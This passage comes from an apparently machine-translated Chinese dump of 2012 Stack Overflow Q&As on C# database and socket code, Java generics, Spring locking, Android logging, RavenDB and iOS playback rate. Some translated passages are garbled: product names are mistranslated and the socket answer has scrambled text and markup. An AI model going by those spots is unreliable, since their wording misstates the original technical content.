        currentRecord = 0;
        OleDbConnection myConnection = new OleDbConnection(access7ConnectionString);
        OleDbDataAdapter myAdapter = new OleDbDataAdapter(selectCommand, myConnection);
        myDataTable = new DataTable();

        try
        {
            myConnection.Open();
            myAdapter.SelectCommand.CommandText = selectCommand;
            myAdapter.Fill(myDataTable);
            myConnection.Close();
        }
        catch (Exception ex)
        {
            MessageBox.Show("Error in FillDataTable : \r\n" + ex.Message);
        }
        DisplayRow(currentRecord);

    }

    private void DisplayRow(int rowIndex)
    {
        // Check that we can retrieve the given row
        if (myDataTable.Rows.Count == 0)
            return; // nothing to display
        if (rowIndex >= myDataTable.Rows.Count)
            //resets the index to 0 when you get past the last record
            rowIndex = 0;
        //if rowIndex is less then 0 set it to the last row
        if (rowIndex < 0)
            rowIndex = myDataTable.Rows.Count - 1;

        // If we get this far then we can retrieve the data
        try
        {
            DataRow row = myDataTable.Rows[rowIndex];
            textBox1.Text = row["FilePath"].ToString();
            textBox2.Text = row["Subject"].ToString();
            textBox3.Text = row["Title"].ToString();
            textBox4.Text = row["Keywords"].ToString();
            textBox5.Text = row["MediaType"].ToString();
        }
        catch (Exception ex)
        {
            MessageBox.Show("Error in DisplayRow : \r\n" + ex.Message);
        }

    }

    public Media()
    {
        InitializeComponent();
        string command = "SELECT * FROM Media";
        //the try catch is in the FillDataTable method
        FillDataTable(command);
    }

    private void label2_Click(object sender, EventArgs e)
    {

    }

    private void button2_Click(object sender, EventArgs e)
    {
        //assuming this cycles through the data
        currentRecord++;
        DisplayRow(currentRecord);
    }

    private void button6_Click(object sender, EventArgs e)
    {
        //assuming this resets the data
        currentRecord = 0;
        this.DisplayRow(currentRecord);
    }

    private void button1_Click(object sender, EventArgs e)
    {
        //assuming this cycles through the data
        currentRecord++;
        DisplayRow(currentRecord);
    }
} 
```

}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T10:27:49.920

放置一个调试器书签`private void DisplayRow(int rowIndex)`，看看在调试应用程序时书签是否突出显示。如果不是，则检查您的调用显示行的循环是否正确

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T10:55:39.040

问题是你的编号。我假设您的 currentRecord 以 1、2、3 等开头，如果您需要使用这种情况

```
if (currentRecord <= myDataTable.Rows.Count -1) 
```

这样，当您的 currentRecord 为 1 时，它将小于或等于 (totalcount 2 - 1 = 1)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-09T11:11:35.757

在这里，我为您写了整个事情，正如在另一个线程中讨论的那样。希望它有效。

```
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Data.OleDb;
namespace MediaPlayer
{
public partial class Media : Form
{

// Use this connection string if your database has the extension .accdb
private const String access7ConnectionString = @"Provider=Microsoft.ACE.OLEDB.12.0;Data Source=|DataDirectory|\MediaDatabase.accdb";
// Use this connection string if your database has the extension .mdb
private const String access2003ConnectionString = @"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=|DataDirectory|\MediaDatabase.mdb";
// Data components
private DataTable myDataTable;

// Index of the current record
private int currentRecord = 0;

private void FillDataTable(string selectCommand)
{
    currentRecord=0;    
    OleDbConnection myConnection = new OleDbConnection(access7ConnectionString);
    OleDbDataAdapter myAdapter = new OleDbDataAdapter(selectCommand, myConnection);
    myDataTable = new DataTable();

    try
    {
        myConnection.Open();
        myAdapter.SelectCommand.CommandText = selectCommand;
        myAdapter.Fill(myDataTable);
        myConnection.Close();
    }
    catch (Exception ex)
    {
        MessageBox.Show("Error in FillDataTable : \r\n" + ex.Message);
    }
    DisplayRow(currentRecord);

}

private void DisplayRow(int rowIndex)
{
    // Check that we can retrieve the given row
    if (myDataTable.Rows.Count == 0)
        return; // nothing to display
    if (rowIndex >= myDataTable.Rows.Count)
        //resets the index to 0 when you get past the last record
        rowIndex=0;
    //if rowIndex is less then 0 set it to the last row
    if (rowIndex<0) 
        rowIndex = myDataTable.Rows.Count-1;

    // If we get this far then we can retrieve the data
    try
    {
        DataRow row = myDataTable.Rows[rowIndex];
        textBox1.Text = row["FilePath"].ToString();
        textBox2.Text = row["Subject"].ToString();
        textBox3.Text = row["Title"].ToString();
        textBox4.Text = row["Keywords"].ToString();
        textBox5.Text = row["MediaType"].ToString();
    }
    catch (Exception ex)
    {
        MessageBox.Show("Error in DisplayRow : \r\n" + ex.Message);
    }

}

public Media()
{
    InitializeComponent();
    string command = "SELECT * FROM Media";
    //the try catch is in the FillDataTable method
    FillDataTable(command);
}

private void label2_Click(object sender, EventArgs e)
{

}

private void button2_Click(object sender, EventArgs e)
{
   //assuming this cycles through the data
    currentRecord++;
    DisplayRow(currentRecord);
}

private void button6_Click(object sender, EventArgs e)
{
   //assuming this resets the data
    currentRecord=0;
    this.DisplayRow(currentRecord);
}
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-09T12:45:07.890

我添加了一堆 MessageBox 来帮助调试，试试这个并告诉我你得到了什么消息？

```
namespace MediaPlayer
{
public partial class Media : Form
{

    // Use this connection string if your database has the extension .accdb
    private const String access7ConnectionString = @"Provider=Microsoft.ACE.OLEDB.12.0;Data Source=|DataDirectory|\MediaDatabase.accdb";
    // Use this connection string if your database has the extension .mdb
    private const String access2003ConnectionString = @"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=|DataDirectory|\MediaDatabase.mdb";
    // Data components
    private DataTable myDataTable;

    // Index of the current record
    private int currentRecord = 0;

    private void FillDataTable(string selectCommand)
    {
        currentRecord = 0;
        OleDbConnection myConnection = new OleDbConnection(access7ConnectionString);
        OleDbDataAdapter myAdapter = new OleDbDataAdapter(selectCommand, myConnection);
        myDataTable = new DataTable();
        try
        {
            myConnection.Open();
            myAdapter.SelectCommand.CommandText = selectCommand;
            myAdapter.Fill(myDataTable);
            myConnection.Close();
            MessageBox.Show("We filled the dataTable");
        }
        catch (Exception ex)
        {
            MessageBox.Show("Error in FillDataTable : \r\n" + ex.Message);
        }
        MessageBox.Show(myDataTable.Rows.Count.ToString());
        DisplayRow(currentRecord);

    }

    private void DisplayRow(int rowIndex)
    {
        // Check that we can retrieve the given row
        if (myDataTable.Rows.Count == 0)
        {
            MessageBox.Show("No rows to Display");
            return; // nothing to display
        }
        if (rowIndex >= myDataTable.Rows.Count)
            //resets the index to 0 when you get past the last record
            rowIndex = 0;
        //if rowIndex is less then 0 set it to the last row
        if (rowIndex < 0)
            rowIndex = myDataTable.Rows.Count - 1;

        // If we get this far then we can retrieve the data
        try
        {
            DataRow row = myDataTable.Rows[rowIndex];
                        textBox1.Text = row["FilePath"].ToString();
                        textBox2.Text = row["Subject"].ToString();
                        textBox3.Text = row["Title"].ToString();
                        textBox4.Text = row["Keywords"].ToString();
                        textBox5.Text = row["MediaType"].ToString();
        }
        catch (Exception ex)
        {
            MessageBox.Show("Error in DisplayRow : \r\n" + ex.Message);
        }

    }
    public Media()
    {
        InitializeComponent();
        string command = "SELECT * FROM Media";
        //the try catch is in the FillDataTable method
        FillDataTable(command);
    }

    private void button2_Click(object sender, EventArgs e)
    {
        //assuming this cycles through the data
        currentRecord++;
        DisplayRow(currentRecord);
    }

    private void button6_Click(object sender, EventArgs e)
    {
        //assuming this resets the data
        currentRecord = 0;
        this.DisplayRow(currentRecord);
    }

    private void button1_Click(object sender, EventArgs e)
    {
        //assuming this cycles through the data
        currentRecord++;
        DisplayRow(currentRecord);
    }
} 
```

}

# java - 编译器插入的方法（通过类型擦除）是否易失？

> ID：10514162
> 
> 赞同：2
> 
> 时间：2012-05-09T10:21:16.977
> 
> 标签：java, debugging, generics, reflection

[Essential Java Generics](http://anders.janmyr.com/2006/11/essential-java-generics.html)声明此代码的输出：

```
public interface Foo<T> {
    void foo(T param);
}

public class Bar implements Foo<Bar> {
    // This method will appear twice once with Object as parameter and once with Bar.
    public void foo(Bar param) {
    }

    public static void main(String[] args) {
        for (Method m : Bar.class.getMethods())
            if (m.getName().startsWith("foo"))
                System.out.println(m.toGenericString());
    }
} 
```

是：

```
public void Bar.foo(Bar)
public volatile void Bar.foo(java.lang.Object) 
```

但是当我编译（1.7编译器）并运行代码时，我有：

```
public void Bar.foo(Bar)
public void Bar.foo(java.lang.Object) 
```

我使用 1.6 编译器重新编译它。但我的输出仍然是一样的。

作者的准确报价是：

> ```
> $ java Bar
> public void Bar.foo(Bar)
> public volatile void Bar.foo(java.lang.Object) 
> ```

因此，这似乎不是他的拼写错误。

是什么导致输出不同？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-09T10:23:26.147

**Java 中不存在 volatile 方法。**只有字段可以是可变的。

请参阅[为什么在 java 中使方法易变？](https://stackoverflow.com/questions/6651867/why-make-a-method-volatile-in-java)了解更多详情。

正如上面的答案所解释的那样，相同的位掩码 ( `0x00000040`) 用于字段和方法的不同目的。这会混淆一些较旧的 Java 工具，导致它们错误地将[桥接方法](https://stackoverflow.com/a/289745/367273)标记为`volatile`.

换句话说，博客作者当时使用的软件存在错误，导致该软件错误地将 包含`volatile`在打印输出中。[该错误已修复](http://bugs.sun.com/view_bug.do?bug_id=6261502)，您不再看到错误的修饰符。

# api - Facebook 2012 年 6 月 6 日变更

> ID：10514165
> 
> 赞同：0
> 
> 时间：2012-05-09T10:21:35.553
> 
> 标签：api, fbml

Facebook 开发者路线图可在以下网址获得：http: [//developers.facebook.com/roadmap/](http://developers.facebook.com/roadmap/) 这表示 - 2012 年**6 月 6 日** *“删除 FBML - FBML 应用程序将不再在平台上运行。所有 FBML 端点都将被删除。”*

我们有一个应用程序，它是画布类型“IFrame”。在这个应用程序中，我们使用了 Ajax.FBML 和 setInnerFBML 方法。那么，这些方法会因为 2012 年 6 月 6 日的变化而受到影响吗？

此外，我们的应用程序在许多地方使用“fb:profile-pic”标签来显示来自 Facebook 的用户照片。这会因为 FBML 更改而受到影响吗？

问候， KK

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-22T17:35:07.593

是的，您正在使用 FBML，因此当 FBML 被删除时您会受到影响 - 您应该尽快更改您的应用程序以使用 iframe，并使用 API 来检索您需要的任何用户数据，而不是让 Facebook 为您呈现它

# java - 在 Java 中同步访问资源（Spring MVC）

> ID：10514170
> 
> 赞同：1
> 
> 时间：2012-05-09T10:22:03.333
> 
> 标签：java, spring, spring-mvc

我编写了一项服务，为用户在我的网站上动态上传的图像生成缩略图。这是它的工作方式：

获取缩略图：

1.  检查之前是否请求过此缩略图
2.  如果不是，将原始图像调整为请求的大小并将其缓存在硬盘上
3.  返回缓存在硬盘上的缩略图

上传另一张图片：

1.  检查这张图片之前是否上传过（例如用户可能正在更新他的头像，旧的可以删除）
2.  如果是，请删除旧图像的所有缩略图
3.  保存/覆盖新上传的图像

问题出在第 2 点。当用户请求缩略图时。如果两个用户在完全相同的时间请求相同的缩略图并且之前没有调整大小怎么办？这两个请求都会告诉服务器调整原始图片的大小并将其保存在硬盘上。**这两个请求会同时尝试在硬盘上写入同一个文件**，从而导致明显的访问问题。

如何避免 Spring MVC 中的这种冲突？所有这些缩略图逻辑都在 Spring 控制器中进行管理，如下所示：

```
@RequestMapping("/images/{width:\\d{1,10}}x{height:\\d{1,10}}/{subject:.+}.{ext:png|gif|jpg|PNG|GIF|JPG}")
public void thumbnail(HttpServletResponse response,
                   HttpServletRequest request,
                   @PathVariable("width") int width,
                   @PathVariable("height") int height,
                   @PathVariable("subject") String subject,
                   @PathVariable("ext") String ext) throws IOException
{
    // ...
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T10:54:16.093

*   检查文件是否存在。

*   如果文件不存在：

    *   创建一个ReentrantLock，并将其存储在一个ConcurrentHashMap中，以文件的路径为key，使用该`putIfAbsent()`方法。

    *   如果`putIfAbsent()`返回一个锁，那么在下面使用这个锁。否则，请使用您创建并存储在地图中的锁。

    *   获取 ReentrantLock 上的锁。

    *   获得锁后，检查文件是否存在。如果没有，请创建它。否则，您无需做任何事情，因为之前有一个并发线程创建了它。

    *   释放锁并将其从地图中移除（在 finally 块中）。

*   读取文件并返回其内容。

# .net - 使用选择的论据：RavenDB 与 SQL Server - 性能、可靠性和简单性

> ID：10514172
> 
> 赞同：25
> 
> 时间：2012-05-09T10:22:05.443
> 
> 标签：.net, sql-server, ravendb

在为 Web 应用程序选择数据层时应考虑哪些方面？

使用文档数据库而不是关系数据库，在开发大型和重载的小型项目时，是否有任何更好的选择，反之亦然？

这些方法首选哪种数据库架构 - 如果我有没有太多关系的简单数据库，使用一种方法比另一种方法更好吗？

* * *

## 回答 #1

> 赞同：56
> 
> 时间：2012-05-09T15:13:53.903

由于这个问题是邀请个人评论，这是我的*意见*：

SQL Server 不是用于存储除临时报告数据之外的任何内容的数据库。非常棒的是，即席报告、数据挖掘、实时关系发现——它最适合这些用途，因为早在 Codd 设计规则时，这就是它的设计目的（更多信息请参阅[数据驱动的阴谋](http://biofractal.blogspot.co.uk/2009/02/data-driven-conspiracy.html)）细节）

当然，您可以将其他类型的数据存储在关系数据库中。例如，您可以将域状态序列化到 SQL Server 数据库并在以后检索该状态，但这是对关系系统的糟糕使用。太糟糕了，事实上，需要整个代码层（所谓的“数据层”或 DAL），数千行，才能使这种任务远程可行、可测试、可维护。

对于基于 SQL 的零售商来说，长达数十年的伟大信心技巧一直是让我们相信，除了在完全不同的数据结构之间进行实时转换之外，没有更好的方法来存储分层/文档数据。DAL 和最新的 ORM 都被吹捧过，但归根结底，这些只不过是在不同数据组织之间来回传输数据的编解码器 - 磁盘上的不同模式。

疯狂！

因此，忘记所有关于原子性、一致性、隔离性、持久性的琐碎、愚蠢的争论吧。房间里的大象是，如果您使用的是 SQL Server，并且您不是一家动态挖掘数据立方体以在大量人群中进行隐藏推理的制药公司（您是吗？），那么您可能使用了错误的技术来存储您的数据.

另一方面，如果你是一个不起眼的应用程序开发人员——一个像我们大多数人一样的程序员，只是希望以一种并不意味着学习一套全新的意识形态和语法的方式序列化域状态，那么老天爷为了，不要使用关系数据库。只是不要。

乌鸦数据库？我已经使用了一段时间（通过 DB4O 和 CouchBase 进化），我可以说它确实做到了它在锡上所说的那样。它存储我的东西并在我要求时将其归还给我。我不必编写任何数据层，也不必使用第三方 ORM。我不必学习结构化查询语言，也不必附加额外的东西来使全文搜索工作（RavenDB 基于 Lucene，所以一切都“正常工作”）。到目前为止，一切都很好。

但实际上，只要它是手头的任务、易于编码、快速和高效，你使用什么是否重要？对于正常的应用程序开发，RavenDB 是所有这些东西，而 SQL Server 不是。这并不是说关系数据库不好——我们不要责怪受害者——我完全承认，对于某些专门的开发，你可能确实需要一些更……异国情调的东西，这样的关系数据存储。

但是，如果您仍然坚持使用残骸，您需要问自己这个问题：如果我们一直在使用简单、快速、优雅的数据存储，这些数据存储非常适合我们作为应用程序开发人员的需求，然后我写了一篇观点文章敦促您采用 SQL Server，那么你很可能会嘲笑我或同情我。有一件事是肯定的——你不会切换到 SQL Server。因此，我们证明了惯性本身就是使 SQL Server 成为主流的指导力量。惰性和无知。惰性、无知和企业贪婪....

# android - 使用哪个 Android 日志框架？

> ID：10514175
> 
> 赞同：54
> 
> 时间：2012-05-09T10:22:18.217
> 
> 标签：android, logging, log4j, slf4j

我的问题似乎很容易回答，但有几个很好的解决方案。我喜欢选择“最好的”。

# 可用的框架（请随时提出更多建议）：

*   [雄激素](http://akquinet.github.com/androlog/)
*   [SLF4J 安卓](http://www.slf4j.org/android/)
*   [Log4J - 安卓](http://code.google.com/p/android-logging-log4j/)

# 优点缺点：

## 雄激素：

*   优点：类似于Android日志框架，所以对现有代码只有很小的改动；能够在错误报告中发送更详细的崩溃报告（异常日志）；漂亮的原木
*   缺点：没有标准的 java“getLogger”方法；通过将属性文件上传到 sdcard 可实现生产配置；我需要手动调用初始化日志；需要创建 LOG_TAG 类常量，或者通过 Aspect 破解它来创建日志标签常量以实现标准行为：标签是类名；当日志记录是一项业务需求时，我们需要对其进行测试。在 Android 上测试静态调用几乎是不可能的；记录器不能被框架注入

## Log4J-安卓：

*   Pro：登录Java的标准方式；与 SLF4J 兼容；能够解析属性文件；
*   缺点：没有内置崩溃报告系统；在我看来：它不常用，所以使用它可能很危险；

## SLF4J-安卓：

*   Pro：好像是由更多人开发的，比如Log4J-Android；`logger.debug("Some log message. Details: {}", someObject.toString());`如果关闭记录器，这是一种跳过字符串连接的好方法；委托给`android.util.Log`.
*   缺点：由于 Android 平台上日志标签的长度限制（例如，`com.example.myapp.MyClass`标签翻译`c*.e*.m*.MyClass`为) ; 没有内置的崩溃报告系统。`com.example.app.MyClass``com.example.anotherapp.MyClass``c*.e*.a*.MyClass`

除此之外，我喜欢 Androlog 的行为，但我是一名 Java 开发人员，熟悉 log4j/slf4j。我们肯定需要崩溃报告系统，但是有几个崩溃报告框架（除了android默认的崩溃报告）。

我可以组合其中的一些，例如使用Log4J android，但是创建一个appender 来使用androlog 框架，但迟早会变得一团糟，应该避免。

感谢您的建议，我希望结果将有助于将来决定其他人。

编辑：如下所述，我可以将例如：log4j-android 与 slf4j 结合使用（如果我将使用 log4j，我更喜欢这样做，因为日志格式支持 ("{}",...) ），但确实如此不回答问题。我必须选择一个框架，然后我可以用 SLF4J 外观装饰它。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-03-19T04:13:23.787

更好的方法。我想，就是使用SLF4J API + 对其的一些实现。

对于 Android 应用程序，您可以使用以下内容：

1.  [Android Logger](https://github.com/noveogroup/android-logger)是轻量级但易于配置的 SLF4J 实现 (< 50 Kb)。
2.  [LOGBack](http://logback.qos.ch)是最强大和优化的实现，但它的大小约为 1 Mb。
3.  其他任何你喜欢的：[slf4jandroid](https://github.com/interdroid/slf4android)，[slf4j-android](https://github.com/twwwt/slf4j)。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-05-09T10:46:56.627

[请](https://softwareengineering.stackexchange.com/questions/108683/slf4j-vs-log4j-which-one-to-prefer)检查第一个答案

它说：

> SLF4J 基本上是一个抽象层。它不是日志记录实现。这意味着如果您正在编写一个库并使用 SLF4J，您可以将该库提供给其他人使用，他们可以选择使用 SLF4J 的日志记录实现，例如 log4j 或 Java 日志记录 API。它有助于防止项目仅仅因为它们使用依赖于它们的库而依赖于大量日志记录 API。
> 
> 所以，总结一下：SLF4J 不会取代 log4j，它们是一起工作的。它从您的库/应用程序中删除了对 log4j 的依赖。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-07-29T18:28:13.040

我已经尝试过[原始的 slf4j.org-android](http://www.slf4j.org/android/)但不幸的是，这个 jar 无法获取要记录的调试/详细消息，因为它在内部使用 LOG.isDebugEnabled() 进行调试输出，这似乎总是错误的。

目前我使用替代[lp0-slf4j-android](https://github.com/lp0/slf4j-android)实现，它使用带有日志记录设置的属性文件，如果启用，我还可以获得调试/详细消息。

# c# - 一个空的缓冲区套接字

> ID：10514179
> 
> 赞同：0
> 
> 时间：2012-05-09T10:22:28.550
> 
> 标签：c#, nhibernate, sockets

我有这个代码服务器部分：

```
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Xml;
using System.Net.Sockets;
using System.Net;
using System.Threading;
using System.IO;
using System.Diagnostics;
namespace server
{
    public partial class server : Form
    {
        public  byte[] data;

        public  byte[] data1;
        public static Socket sock ;
        public static List<Socket> sock_li = new List<Socket>();
        public delegate void operation(string s);
        public delegate void operation2();
        public delegate bool verifier();
        public static int nombre = 0;

        public server()
        {
            InitializeComponent();
          this.Show();
          data1 = new byte[1024];
          data = new byte[1024];
          comboBox1.Items.Add(0);
         sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
              IPAddress adress = IPAddress.Parse("127.0.0.1");
              IPEndPoint iep = new IPEndPoint(adress, 4000);
              EndPoint ep = (EndPoint)iep;
              sock.Bind(iep);
              sock.Listen(1000);
               sock_li.Add(sock.Accept());

               if (this.InvokeRequired) Invoke((operation)effectuer4, "le client " + 0 + " a rejoint le chat");
               else effectuer4("le client " + 0 + " a rejoint le chat");
               Thread li = new Thread(liste);
               li.Start();

               Thread ko = new Thread(new ParameterizedThreadStart(listenning));
               ko.Start(0);
          }
        public void liste() {
            nombre = 1;
        while (true)
              {
                  sock_li.Add(sock.Accept());
                  if (this.InvokeRequired) Invoke((operation)effectuer4, "le client " + nombre.ToString() + " a rejoint le chat");
                  else effectuer4("le client " + nombre.ToString() + " a rejoint le chat");
                  if (this.InvokeRequired) Invoke((operation)effectuer5,  nombre.ToString() );
                  else effectuer5( nombre.ToString() );
                  Thread ko = new Thread(new ParameterizedThreadStart(listenning));
                  ko.Start(nombre);
                  nombre++;
              }

        }

        private void effectuer5(string p)
        {
            comboBox1.Items.Add(p);
        }
        public void listenning(Object j)
        {

            int i = (int)j;

            String s="";
            while (true)
            {
                if (sock_li[i].Receive(data) > 0)
                {
                 s = ASCIIEncoding.ASCII.GetString(data);

                              if (this.InvokeRequired) Invoke((operation)effectuer4, "client " + i.ToString() + " : " + s);
                              else effectuer4("client " + i.ToString() + " : " + s);

                }

            }
        }
        private void effectuer(String s)
        {
            textBox1.Text += "serveur:  " + s + "\r\n";
              message.Text  = "";
        }
        private void effectuer4(String s)
        {
            textBox1.Text +=  s + "\r\n"; message.Text = "";

        }

      private void buttonDisconnect_Click(object sender, EventArgs e)
        {
            sock.Close();
            Application.Exit();
             }
    private void buttonSend_Click(object sender, EventArgs e)
        {
           String s = message.Text ;
           data1.Initialize();
            data1 = System.Text.Encoding.ASCII.GetBytes(s);

            int i = int.Parse(comboBox1.SelectedItem.ToString());
            sock_li[i].Send(data1);

       if (InvokeRequired) Invoke((operation)effectuer, s); else effectuer(s);

           }
        }
     } 
```

部分客户是：

```
 using System;
    using System.Collections.Generic;
    using System.ComponentModel;
    using System.Data;
    using System.Drawing;
    using System.Text;
    using System.Windows.Forms;
    using System.Timers;
    using System.Threading;
    using TrackingUnitSimulator;
    using NHibernate;
    using System.Xml;
    using System.IO;
    using System.Net;
    using System.Net.Sockets;
    using System.Diagnostics;
    using base_donnee;

    namespace GUInterface
    {
        public partial class TrackingUnitClientForm : Form
        {
            #region variables
            public string fich_log = "";
            public Socket sock;
            public IPEndPoint ipEnd = null;
            public static bool connexion = false;
            private static byte[] data;
            public static byte[] data1;
            public  string serial;
            public string[] types= new string[6]{  "EasyTrace"," WatchTrace","MultiTrace","PocketTrace","TrailerTrace","SmartTrace"};
            public static string[] typ = new string[100];
            public static string[] validite = new string[100];
            public static float[] longi = new float[100];
            public static float[] lati = new float[100];
           public static float[] scenarios = new float[100];
            public static int nombre = 0;
           public static TCPClient tcpClient = null;
           public static int[] tab = new int[6];
           public static int debut = 0;
           public static int fin = 0;
           public static string s;
           public int atte = 0;

            public static scenario sc = null;
            #endregion
           #region delegates
           delegate void CommandReceivedCallBack(TCPClient tcpClient, string commandText);
           delegate void faire(string s);
           delegate void faire2(string s1, string s2);
           delegate void masquer(int i);
           delegate void received(string i);
           #endregion

            public void received1(string i)
            {
                receivedCommand.Text += "  New command: " + i + "\r\n";
            }

            #endregion

            public TrackingUnitClientForm(string b, bool ver, string fichier_log, string fichier_scenario)
            {
                InitializeComponent();
                fich_log = fichier_log;
                Disconnexionbt.Hide();
                sc = new scenario(@fichier_scenario);
                serial = b;
                int p = 0;
                Random m = new Random();
                p = m.Next(0, 5);
                if (ver == true)
                {
                    equipment cr = new equipment();
                    cr.enregistrer(b, types[p]);
                }
                label4.Text = types[p];
                label2.Text = serial;

                if (fich_log != "")
                {

                    if (InvokeRequired) Invoke((faire)log, DateTime.Now.ToString() + " | " + "L'équipment num" + serial.ToString() + " se connecte\r\n");
                    else log(DateTime.Now.ToString() + " | " + "L'équipment num" + serial.ToString() + " se connecte\r\n");
                }
                connecter();

                  Thread th = new Thread(listening);
                th.Start();

            }

            public void connecter() {
                try
                {
                    IPAddress adress = IPAddress.Parse("127.0.0.1");
                    ipEnd = new IPEndPoint(adress, 4000);
                    sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    sock.Connect(ipEnd);
                    this.Connexionbt.Hide();
                    this.Disconnexionbt.Show();
                    lblConnectionStatus.Text = "Online";
                    lblConnectionStatus.ForeColor = Color.Blue;

                }
                catch (Exception exc)
                {

                    if (InvokeRequired) Invoke((masquer)masquer1, 4);
                    else
                        this.Disconnexionbt.Hide();
                    lblConnectionStatus.Text = "Offline";
                    lblConnectionStatus.ForeColor = Color.Red;
                    MessageBox.Show(exc.Message, Text);
                }
                }
            public void listening() {
                String s = null;
               try
                {
                repeter:

                    data = new byte[1024];
                s = ASCIIEncoding.ASCII.GetString(data);
                    if (sock.Receive(data) > 0 && s!="")
                    {

                        if (String.Compare(s, "$$Y01") == 0)
                        {
                            if (InvokeRequired) Invoke((received)received1, "Actual Postion Request"); else received1("Actual Postion Request");
                        }
                        else if (String.Compare(s, "$$Y03") == 0)
                        {
                            if (InvokeRequired) Invoke((received)received1, "Stop The Vehicle"); else received1("Stop The Vehicle");
                        }
                        else if (String.Compare(s, "$$Y06") == 0)
                        {
                            if (InvokeRequired) Invoke((received)received1, "Cancel The Stop"); else received1("Cancel The Stop");
                        }
                        else
                        {
                            if (InvokeRequired) Invoke((received)received1, s); else receivedCommand.Text += s + "\r\n";
                        }

                    }
                    data = new byte[0];
                    goto repeter;

                }
                catch { }
            }

        }
    } 
```

但我有这个问题：当我执行超过 2 个客户端时，一些消息将是空的，尤其是第一个（缓冲区数据为空！！）我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T10:36:25.950

```
 data = new byte[1024];
 s = ASCIIEncoding.ASCII.GetString(data);
 if (sock.Receive(data) > 0 && s!="")
 { 
```

**k...这会**`s`分配一个新的缓冲区（全零） ，解码这个全零缓冲区以获得一个字符串（，然后将（我们知道它来自全零）与一些**我们已经知道它是 none 的预期字符串进行比较**。**`s`**

 ****所以是的，第一个“接收”总是会错过你的开关，只是因为你没有正确解码。然而！您**不得**假设每个“接收”都会从单个“发送”中获取数据。这里的 TCP 只是一个流。您将获得“一些数据”，可能是：

*   如果你真的很幸运，正好是一条消息
*   消息的一部分
*   27条小消息
*   一条消息的结尾，以及整个第二条消息，以及第三条消息的开始（不完整）

这就是为什么您需要使用“框架”来检测流上的子消息的原因，例如在基于文本的协议中查找换行符，或者在二进制协议中使用长度前缀数据。

由于这是 ASCII，因此您不必担心部分字符，但您仍然需要保留 的结果`Receive`，以便您知道要在里面查看多少字节`data`（即，如果您只从套接字获取 27 个字节，您应该只**解码**27 个字节）。

[您可能会发现这有助于](http://www.codeproject.com/Articles/37496/TCP-IP-Protocol-Design-Message-Framing)进一步理解这一点。****

# java - 启动目录

> ID：10514184
> 
> 赞同：0
> 
> 时间：2012-05-09T10:23:12.087
> 
> 标签：java, windows, batch-file

我正在开发 java 程序，我需要让它在每次重新启动时为用户 pc 开始工作。如何找到启动目录路径以将 batch.bat 文件独立于用户 pc 上使用的操作系统放入其中？

纠正我的问题：

我正在开发java程序，我需要让它在每次重启用户pc时开始工作。我怎么能在不同的平台上做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T10:37:10.797

您必须确定使用哪个操作系统并相应地放置您的应用程序

赢7：

```
%systemdrive%\users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T14:25:29.603

您可以通过在任何 Windows 平台上使用注册表来让生活更轻松，这在至少 XP 的所有版本中都是相同的。

```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 
```

我不确定其他操作系统。

# iphone - 以 2x 3x 4x 速度播放/转发视频 - iPhone SDK

> ID：10514185
> 
> 赞同：3
> 
> 时间：2012-05-09T10:23:14.073
> 
> 标签：iphone, ios, mpmovieplayercontroller

我想以不同的速度在 MPMoviePlayerController 中播放/转发视频。任何人都可以建议我如何做到这一点。

现在我正在快进（单速），但几秒钟后它又恢复正常速度。

请建议。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-09T10:42:41.487

```
MPMoviePlayerController Conforms to MPMediaPlayback protocol 
you can see the property currentPlaybackRate as :-
@property(nonatomic) float currentPlaybackRate 
A value of 0 represents that the video is stopped , a value of 1 indicates normal speed and further positive values indicate increased speed while negative ones indicate reverse . 
```

还要检查你的 MPMediaPlayback 的 endseeing 委托方法，因为它是恢复正常播放的唯一方法

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-10-01T07:08:22.157

**这是 MPMoviePlayerViewController 以 2x 3x 4x 速度前进和后退电影的代码**

**在 .h 文件中**

```
@property(nonatomic) float currentPlaybackRate; 
```

**在 .m 文件中**

```
- (void)viewDidLoad
{
    currentPlaybackRate=1.0; //video Play in Normal speed
} 
```

**现在在 FastForward 和 FastBackward 按钮操作**

```
[fastForward addTarget:self action:@selector(fastForward) forControlEvents:UIControlEventTouchUpInside];

[fastBackWard addTarget:self action:@selector(fastBackward) forControlEvents:UIControlEventTouchUpInside]; 
```

**动作代码**

```
-(void)fastForward
{
    [mp.moviePlayer pause];
    playPauseButton.selected=TRUE;
    if (currentPlaybackRate < 0.0) {
        currentPlaybackRate = 1.0;
    }

    if (currentPlaybackRate < 4.0) {
        currentPlaybackRate=currentPlaybackRate+1.0;
        NSLog(@"Forward::%f",currentPlaybackRate);
        mp.moviePlayer.currentPlaybackRate=currentPlaybackRate;
    }
}
-(void)fastBackward
{
    [mp.moviePlayer pause];
    playPauseButton.selected=TRUE;

    if (currentPlaybackRate > 0.0) {
        currentPlaybackRate = 0.0;
    }

    if (currentPlaybackRate > -4.0) {
        currentPlaybackRate=currentPlaybackRate-1.0;
